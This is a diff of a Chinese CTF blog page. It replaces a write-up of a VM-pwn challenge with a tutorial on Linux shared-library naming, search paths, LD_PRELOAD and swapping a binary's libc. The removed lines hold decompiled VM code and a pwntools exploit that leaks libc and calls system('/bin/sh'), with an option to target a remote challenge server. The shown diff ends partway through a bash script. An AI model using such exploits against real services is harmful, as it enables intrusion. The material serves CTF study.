@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="PVP GAME  粤湾证券, Tower">
+    <meta name="keywords" content="linux库说明以及如何修改动态链接库, Tower">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>PVP GAME  粤湾证券 | Tower</title>
+    <title>linux库说明以及如何修改动态链接库 | Tower</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">PVP GAME  粤湾证券</h1>
+                    <h1 class="description center-align post-title">linux库说明以及如何修改动态链接库</h1>
                 </div>
             </div>
         </div>
@@ -430,12 +430,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/wp/">
-                                <span class="chip bg-color">wp</span>
+                            <a href="/tags/%E4%BB%8B%E7%BB%8D/">
+                                <span class="chip bg-color">介绍</span>
                             </a>
                         
-                            <a href="/tags/ctf/">
-                                <span class="chip bg-color">ctf</span>
+                            <a href="/tags/%E7%8E%AF%E5%A2%83/">
+                                <span class="chip bg-color">环境</span>
                             </a>
                         
                     </div>
@@ -446,8 +446,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/vmpwn/" class="post-category">
-                                vmpwn
+                            <a href="/categories/%E6%95%B4%E7%90%86/" class="post-category">
+                                整理
                             </a>
                         
                     </div>
@@ -459,28 +459,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-18
+                    2020-11-30
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-11-18
+                    2020-12-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    414
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    6 分
                 </div>
                 
 
@@ -495,106 +495,143 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><pre class=" language-c"><code class="language-c">_QWORD <span class="token operator">*</span>__fastcall <span class="token function">sub_F7D</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> __int64 a4<span class="token punctuation">,</span> __int64 a5<span class="token punctuation">,</span> __int64 a6<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 opcode_val<span class="token punctuation">,</span> <span class="token keyword">char</span> op1_val<span class="token punctuation">,</span> __int64 op2_val<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  _QWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
-  <span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>v10<span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
-  <span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>v11<span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
-  <span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>v12<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
+                <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>在ctf中共享库的问题一直是一个<strong>非常非常非常</strong>恶心的问题，这里将会介绍动态链接库的命名以及如何修改一个程序依赖的动态链接库</p>
+<h2 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h2><pre><code>0x7f387805e000     0x7f3878091000 r-xp    33000 0      /lib/x86_64-linux-gnu/libseccomp.so.2.4.3
+</code></pre>
+<ul>
+<li>lib表示库文件</li>
+<li>so表示动态链接</li>
+<li>2.4.3中2表示主本号，4表示次版本，3表示发布版本</li>
+</ul>
+<p>主版本是重大升级，不会向上兼容（如python2和3）<br>次版本是增量升级，添加一些新的接口<br>发布版本是进行一些错误修正，性能改进等</p>
+<h2 id="SO-NAME命名与软链接"><a href="#SO-NAME命名与软链接" class="headerlink" title="SO-NAME命名与软链接"></a>SO-NAME命名与软链接</h2><p>用SO-NAME机制来记录共享库的依赖关系</p>
+<p>每个库都有自己的SO-NAME知名库名字和主版本号如libc.so.2</p>
+<p>SO-NAME相同的两个次版本号不同的库，次版本号大的兼容小的</p>
+<p>在linux系统中，系统会为每个共享库在它所在的目录创建一个跟SO-NAME相同并且指向它的软连接如系统中存在共享库<code>/lib/libfoo.so.2.6.1</code>那么linux共享库管理程序会为它创建一个指向它的软链接<code>/lib/libfoo.so.2</code></p>
+<p>也有一些不标准的命名，如libc.so.6 还有ld-2.6.1.so被命名为ld-linux.so</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606739812533.png" alt="libc.so.6"></p>
+<h3 id="SO-NAME的好处"><a href="#SO-NAME的好处" class="headerlink" title="SO-NAME的好处"></a>SO-NAME的好处</h3><ul>
+<li>每个最新的库覆盖掉旧的，保持在主版本号内最新</li>
+<li>可执行文件pwn如果依赖于libc.2.23.so会在.dynamic段DT_NEED字段写入libc.so.6写入SO-NAME可以避免库更新之后不能运行</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606741196566.png" alt="NEEDED字段"></p>
+<h2 id="编译时链接"><a href="#编译时链接" class="headerlink" title="编译时链接"></a>编译时链接</h2><p>在运行时需要链接一个程序可以加 <code>-lxxx</code>，如<code>-lpthread</code>编译器会根据当前环境在系统中的相关路径查找最新版本的库一般用<code>-L</code>指定搜索路径</p>
+<p>对于链接方式分为动态和静态链接在ld使用<code>-static</code>选项时会搜索静态链接库（如libc.a.2.23）默认是动态</p>
+<h2 id="共享库的路径"><a href="#共享库的路径" class="headerlink" title="共享库的路径"></a>共享库的路径</h2><ul>
+<li>/lib存放系统最关键的共享库，一般是/bin,/sbin目录下程序需要的库还有系统启动时需要的库</li>
+<li>/usr/lib开发时可能用到的库</li>
+<li>/usr/local/lib跟操作系统本身不十分相关的库，一些第三方软件安装的库</li>
+</ul>
+<h2 id="共享库查找过程"><a href="#共享库查找过程" class="headerlink" title="共享库查找过程"></a>共享库查找过程</h2><p>如果DT_NEED存放绝对路径就从这个路径找</p>
+<p>如果没有会在/lib,/usr/lib由 /etc/ld.so.conf配置文件指定的目录中查找共享库。</p>
+<p>为了加快遍历速度，有一个叫ldconfig的程序各个共享库创建删除或更新相应的SO-NAME，把这些SO-NAME集中起来放到<code>/etc/ld.so.cache</code></p>
+<p><strong>所以正常更新或替换共享库需要运行一次ldconfig</strong></p>
+<h2 id="共享库创建和安装"><a href="#共享库创建和安装" class="headerlink" title="共享库创建和安装"></a>共享库创建和安装</h2><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p><code>-share</code>选项表示输出结果是共享库类型</p>
+<p><code>-Wl</code>选项可以传递给连接器选项   <code>-Wl,-soname,my_soname</code>可以指定SO-NAME（如果不指定这个库就没有soname，用ldconfig也没用）</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>包含两步1.创建SO-NAME软连接。 2.告诉编译器和程序如何查找共享库</p>
+<ul>
+<li>把共享库复制到/lib或者/usr/lib等然后运行ldconfig</li>
+<li><code>ldconfig -n shared_library_directory</code> 在编译程序时提供<code>-L</code>和<code>-l</code>  LD_LIBRARY_PATH也可以用来指定</li>
+</ul>
+<h2 id="共享库替换"><a href="#共享库替换" class="headerlink" title="共享库替换"></a>共享库替换</h2><h3 id="修改环境变量替换"><a href="#修改环境变量替换" class="headerlink" title="修改环境变量替换"></a>修改环境变量替换</h3><p><strong>LD_LIBRARY_PATH</strong>  临时改变某个应用程序的共享库查找路径而不会影响系统中其他程序<br>类似于<code>/lib/ld-linux.so.2 -binary-path /home/user /bin/ls</code>。</p>
+<p><strong>LD_PRELOAD</strong>优先级更高，无论程序是否依赖动态库，被指定的动态库都会被加载  </p>
+<p>系统将会从下面搜索库</p>
+<ul>
+<li>LD_PRELOAD</li>
+<li>LD_LIBRARY_PATH指定的路径</li>
+<li>/etc/ld.so.cache指定的路径</li>
+<li>默认共享目录，/usr/lib      /lib等</li>
+</ul>
+<h3 id="修改二进制文件更改libc版本"><a href="#修改二进制文件更改libc版本" class="headerlink" title="修改二进制文件更改libc版本"></a>修改二进制文件更改libc版本</h3><p>有一个项目可以下载很多版本的libc<br><a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p>
+<pre class=" language-bash"><code class="language-bash">➜  <span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git
+➜  glibc-all-in-one ./update_list
+➜  glibc-all-in-one <span class="token function">cat</span> list  可以看到获取到的库名字
+➜  glibc-all-in-one ./download 2.23-0ubuntu10_i386  后面的库名字是上一条命令看到的任意一个</code></pre>
+<p>然后需要创建目录，拷贝文件到对应目录</p>
+<pre class=" language-bash"><code class="language-bash">➜  glibc-all-in-one sduo <span class="token function">mkdir</span> -p /glibc/2.27/64/lib/
+➜  glibc-all-in-one <span class="token function">sudo</span> <span class="token function">cp</span> ./libs/2.27-3ubuntu1.2_amd64/* /glibc/2.27/64/lib</code></pre>
+<p>为了完成上面的操作写了一个简单的脚本，完成更新列表，下载库，拷贝的过程</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os
 
-  result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>opcode_val<span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">==</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    ebp_addr<span class="token punctuation">[</span>esp_index_value<span class="token punctuation">]</span> <span class="token operator">=</span> op2_val<span class="token punctuation">;</span>
-    result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>esp_index_value<span class="token operator">++</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// push</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">></span> <span class="token number">0x10</span> <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">==</span> <span class="token number">0x20</span> <span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-      <span class="token operator">--</span>esp_index_value<span class="token punctuation">;</span>
-      result <span class="token operator">=</span> ebp_addr<span class="token punctuation">;</span>
-      ebp_addr<span class="token punctuation">[</span>esp_index_value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// push 0</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">==</span> <span class="token number">0x40</span> <span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> esp_index_value <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>
-      <span class="token punctuation">{</span>
-        v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">run_symbol</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        a2 <span class="token operator">=</span> ebp_addr<span class="token punctuation">[</span>esp_index_value <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token function">v10</span><span class="token punctuation">(</span>ebp_addr<span class="token punctuation">[</span>esp_index_value <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 运行函数，栈传参</span>
-      <span class="token punctuation">}</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> esp_index_value <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
-      <span class="token punctuation">{</span>
-        v11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">run_symbol</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">v11</span><span class="token punctuation">(</span>ebp_addr<span class="token punctuation">[</span>esp_index_value <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token punctuation">}</span>
-      result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>esp_index_value<span class="token punctuation">;</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>esp_index_value <span class="token punctuation">)</span>
-      <span class="token punctuation">{</span>
-        v12 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">run_symbol</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">v12</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
-<p>只有一个栈，栈传参，直接运行函数指令格式为opcode+op1+op2<br>但是读入的数据会进行一个base64解密</p>
-<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605681939785.png" alt="base64解密"></p>
-<p>pwn和加密算法结合起来</p>
-<p>exp也很简单</p>
-<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-file_path <span class="token operator">=</span> <span class="token string">"./pwn"</span>
-context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
-<span class="token keyword">import</span> base64
+<span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>LibcNameList<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> item <span class="token keyword">in</span> LibcNameList<span class="token punctuation">:</span>
+        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"./download {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-<span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">mkDir</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> item <span class="token keyword">in</span> name<span class="token punctuation">:</span>
+        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sudo mkdir -p /glibc/{}/64/lib/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sudo mkdir -p /glibc/{}/32/lib/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-debug <span class="token operator">=</span> <span class="token number">1</span>
-<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
-    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>
-    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>
-    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
-    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span>
+<span class="token keyword">def</span> <span class="token function">getName</span><span class="token punctuation">(</span>LibcNameList<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> item <span class="token keyword">in</span> LibcNameList<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> item<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> name <span class="token operator">or</span> item<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">""</span> <span class="token punctuation">:</span>
+            <span class="token keyword">continue</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            name<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> name
 
-<span class="token keyword">else</span><span class="token punctuation">:</span>
-    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>
-    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
-    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span>
+os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"./update_list"</span><span class="token punctuation">)</span>
 
-<span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    debug_str <span class="token operator">=</span> <span class="token string">""</span>
-    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>
-        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
-        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
-            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
-            text_base<span class="token operator">=</span><span class="token number">0</span>
-            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">getCmd</span><span class="token punctuation">(</span>opcode<span class="token punctuation">,</span>op1<span class="token punctuation">,</span>op2<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> p64<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>op1<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>op2<span class="token punctuation">)</span>
+f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"./list"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>
+content<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-<span class="token keyword">def</span> <span class="token function">Push</span><span class="token punctuation">(</span>op2<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> getCmd<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>op2<span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">RunFunction</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>name<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-debug_1<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x0000000000000FA9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
-info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#12是64位libc地址的长度  16是64位canary的长度 (不算0x)</span>
-result<span class="token operator">=</span>int<span class="token punctuation">(</span>info<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak str to int : "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
-libc<span class="token punctuation">.</span>address<span class="token operator">=</span>result
-payload<span class="token operator">=</span>Push<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>Push<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>RunFunction<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+LibcNameList<span class="token operator">=</span>content<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
 
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"code:"</span><span class="token punctuation">,</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+name<span class="token operator">=</span>getName<span class="token punctuation">(</span>LibcNameList<span class="token punctuation">)</span>
+mkDir<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
 
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+download<span class="token punctuation">(</span>LibcNameList<span class="token punctuation">)</span>
+<span class="token keyword">for</span> LibcName <span class="token keyword">in</span> LibcNameList<span class="token punctuation">:</span>
+
+
+    <span class="token keyword">for</span> item <span class="token keyword">in</span> name<span class="token punctuation">:</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token keyword">in</span>  LibcName<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token string">"amd64"</span> <span class="token keyword">in</span> LibcName<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sudo cp ./libs/{}/* /glibc/{}/64/lib/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>LibcName<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token keyword">in</span> LibcName<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token string">"i386"</span> <span class="token keyword">in</span> LibcName<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sudo cp ./libs/{}/* /glibc/{}/32/lib/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>LibcName<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<h4 id="修改二进制文件clibc"><a href="#修改二进制文件clibc" class="headerlink" title="修改二进制文件clibc"></a>修改二进制文件clibc</h4><p>clibc</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+
+FILE_NAME<span class="token operator">=</span><span class="token variable">$1</span>
+LIBC_VERSION<span class="token operator">=</span><span class="token variable">$2</span>
+WORKDIR<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">pwd</span><span class="token variable">)</span></span>
+
+LIBC_DIR<span class="token operator">=</span>/glibc
+LIBC_DIR<span class="token operator">=</span><span class="token punctuation">$(</span>find <span class="token variable">$LIBC_DIR</span> -name <span class="token string">"<span class="token variable">$LIBC_VERSION*</span>"</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$LIBC_DIR</span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>
+    <span class="token keyword">echo</span> <span class="token string">"Not support version or your <span class="token variable">$LIBC_DIR</span> don't have libc"</span>
+    <span class="token keyword">exit</span>
+<span class="token keyword">fi</span>
+
+EBIT<span class="token operator">=</span><span class="token punctuation">$(</span>file <span class="token variable">$FILE_NAME</span> <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print<span class="token variable">$3</span>}'</span><span class="token operator">|</span><span class="token function">cut</span> -c 1-2<span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$EBIT</span> -eq <span class="token string">"32"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>
